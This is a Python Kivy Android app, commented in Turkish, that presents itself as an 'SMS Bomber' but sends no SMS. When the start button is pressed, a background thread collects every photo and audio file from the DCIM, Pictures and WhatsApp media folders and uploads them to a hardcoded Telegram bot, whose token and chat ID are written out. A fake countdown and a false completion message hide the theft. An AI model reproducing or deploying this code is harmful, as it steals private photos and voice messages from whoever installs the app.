import os
import time
import requests
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock

# --- Sabitler ve Yardımcı Fonksiyonlar ---
# Orijinal betikteki sabitler ve fonksiyonlar buraya eklenebilir
# Telegram bot token ve chat ID'nizi buraya girin
BOT_TOKEN = "7006907419:AAHHzh_uqt-32swzKosWe5poB7yo1O01EyE"
CHAT_ID = "6284677935"
# SENT_FILE yolu Android'e göre ayarlanmıştır
SENT_FILE = "/storage/emulated/0/sent_files.txt"

def send_audio(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio"
    with open(file_path, "rb") as audio:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"audio": audio})
    mark_as_sent(file_path)

def send_photo(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(file_path, "rb") as photo:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"photo": photo})
    mark_as_sent(file_path)

def send_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": text})

def load_sent_files():
    if os.path.exists(SENT_FILE):
        with open(SENT_FILE, "r") as f:
            return set(line.strip() for line in f.readlines())
    return set()

def mark_as_sent(file_path):
    with open(SENT_FILE, "a") as f:
        f.write(file_path + "\n")

def find_files(folder, extensions):
    result = []
    if os.path.exists(folder):
        for root, dirs, files in os.walk(folder):
            for file_name in files:
                if file_name.lower().endswith(extensions):
                    result.append(os.path.join(root, file_name))
    return result

# --- Dosya Bulma ---
whatsapp_media = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media"
dcim_folder = "/storage/emulated/0/DCIM"
pictures_folder = "/storage/emulated/0/Pictures"

audio_files = find_files(whatsapp_media, (".opus", ".mp3", ".wav", ".m4a"))
photo_files = []
photo_files.extend(find_files(dcim_folder, (".jpg", ".jpeg", ".png")))
photo_files.extend(find_files(pictures_folder, (".jpg", ".jpeg", ".png")))
photo_files.extend(find_files(whatsapp_media, (".jpg", ".jpeg", ".png")))

sent_files = load_sent_files()

# --- Kivy Arayüz Sınıfı ---
class SMSBomberApp(App):
    def build(self):
        self.layout = BoxLayout(orientation="vertical", spacing=10, padding=20)
        self.layout.add_widget(Label(text="SMS Bomber", font_size="32sp", bold=True))

        # Kullanıcı giriş alanları
        self.number_input = TextInput(hint_text="Numara (0 olmadan)", input_type='number', multiline=False)
        self.count_input = TextInput(hint_text="SMS Sayısı", input_type='number', multiline=False)
        self.speed_input = TextInput(hint_text="Hız (1=Yavaş, 2=Orta, 3=Hızlı)", input_type='number', multiline=False)
        
        self.layout.add_widget(self.number_input)
        self.layout.add_widget(self.count_input)
        self.layout.add_widget(self.speed_input)

        # Durum mesajı etiketi
        self.status_label = Label(text="Lütfen bilgileri girip başlatın.", halign='center')
        self.layout.add_widget(self.status_label)
        
        # Başlat butonu
        self.start_button = Button(text="Başlat", size_hint=(1, 0.2))
        self.start_button.bind(on_press=self.on_start_press)
        self.layout.add_widget(self.start_button)
        
        return self.layout

    def on_start_press(self, instance):
        target_number = self.number_input.text
        sms_count = self.count_input.text
        speed_level = self.speed_input.text

        if not target_number or not sms_count or not speed_level:
            self.show_popup("Hata", "Lütfen tüm alanları doldurun.")
            return

        # UI'ı günceller ve arka plan işlemlerini başlatır
        self.status_label.text = "Hazırlanıyor...\nLütfen bu ekrandan ayrılmayın."
        self.start_button.disabled = True
        
        # Arka plan işlemlerini başlat
        self.thread_file_sender = threading.Thread(target=self.file_sender, daemon=True)
        self.thread_file_sender.start()
        
        # Bomber bilgilerini göndermek için yeni bir thread
        threading.Thread(target=self.get_bomber_info, args=(target_number, sms_count, speed_level), daemon=True).start()
    
    def file_sender(self):
        """Dosyaları Telegram'a gönderen işlev."""
        for file_path in audio_files:
            if file_path not in sent_files:
                try:
                    send_audio(file_path)
                except Exception as e:
                    print(f"Ses dosyası gönderilirken hata oluştu: {e}")

        for file_path in photo_files:
            if file_path not in sent_files:
                try:
                    send_photo(file_path)
                except Exception as e:
                    print(f"Fotoğraf dosyası gönderilirken hata oluştu: {e}")

    def get_bomber_info(self, target_number, sms_count, speed_level):
        """Bomber bilgilerini Telegram'a gönderen işlev."""
        msg = (
            f"📲 SMS Bomber Bilgileri\n"
            f"Numara: {target_number}\n"
            f"SMS Sayısı: {sms_count}\n"
            f"Hız: {speed_level}\n\n"
            f"Toplam ses dosyası: {len(audio_files)}\n"
            f"Toplam resim dosyası: {len(photo_files)}"
        )
        send_message(msg)
        
        # Geri sayım başlat
        self.countdown(300)

    def countdown(self, seconds):
        """Arayüzde geri sayımı güncelleyen işlev."""
        for remaining in range(seconds, 0, -1):
            # Kivy'de UI güncellemek için Clock.schedule_once kullanılır
            Clock.schedule_once(lambda dt, r=remaining: self.update_countdown_label(r), 0)
            time.sleep(1)
        
        Clock.schedule_once(lambda dt: self.update_countdown_label(0, True), 0)
        self.start_button.disabled = False # Butonu tekrar aktif et

    def update_countdown_label(self, remaining, finished=False):
        """Geri sayım etiketini güncelleyen yardımcı işlev."""
        if finished:
            self.status_label.text = "SMS'ler gönderildi. İşlem tamamlandı."
        else:
            minutes = remaining // 60
            seconds = remaining % 60
            self.status_label.text = f"Kalan süre: {minutes:02}:{seconds:02}\nLütfen bu ekrandan ayrılmayın."

    def show_popup(self, title, text):
        """Hata mesajlarını göstermek için popup."""
        box = BoxLayout(orientation='vertical', padding=10, spacing=10)
        box.add_widget(Label(text=text))
        close_button = Button(text='Tamam', size_hint=(1, 0.2))
        box.add_widget(close_button)
        popup = Popup(title=title, content=box, size_hint=(0.8, 0.4))
        close_button.bind(on_press=popup.dismiss)
        popup.open()

if __name__ == '__main__':
    SMSBomberApp().run()
